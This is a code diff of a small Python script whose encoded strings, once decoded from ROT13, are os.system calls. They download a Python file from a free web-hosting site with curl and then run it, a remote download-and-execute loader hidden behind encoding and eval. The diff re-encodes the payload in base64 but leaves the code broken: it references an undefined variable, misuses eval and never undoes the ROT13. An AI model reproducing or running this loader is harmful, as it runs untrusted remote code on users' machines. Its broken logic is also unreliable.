@@ -1,16 +1,18 @@
 import codecs
+import base64
 import os
 
 first = '''
-bf.flfgrz("phey -B uggcf://anhtug-obbxf.000jroubfgncc.pbz/hjh.cl")
+YmYuZmxmZ3J6KCJwaGV5IC1CIHVnZ2NmOi8vYW5odHVnLW9iYnhmLjAwMGpyb3ViZmduY2MucGJ6L2hqaC5jbCIpCg==
 '''
 
 second = '''
-bf.flfgrz("Clguba hjh.cl")
+YmYuZmxmZ3J6KCJDbGd1YmEgaGpoLmNsIikK
 '''
 
-first_decoded = codecs.decode(first, 'rot13')
-second_decoded = codecs.decode(second, 'rot13')
+first_byte = base64.b64decode(first)
+first_string = first_byte.decode()
+second_byte = base64.b64decode(second)
+second_string = second_string.decode()
 
-eval(first_decoded)
-eval(second_decoded)
+eval(first_string, second_string)
